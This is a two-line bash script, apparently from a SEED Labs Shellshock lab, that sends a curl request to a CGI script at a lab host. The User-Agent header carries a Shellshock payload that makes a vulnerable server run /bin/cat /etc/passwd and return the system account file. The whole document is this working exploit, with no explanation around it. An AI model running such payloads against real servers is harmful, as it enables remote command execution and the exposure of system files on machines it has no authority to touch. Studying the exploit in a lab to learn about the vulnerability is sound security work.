#!/bin/bash

curl -A " () { cat; }; /bin/cat /etc/passwd;" www.seedlab-shellshock.com/cgi-bin/vul.cgi
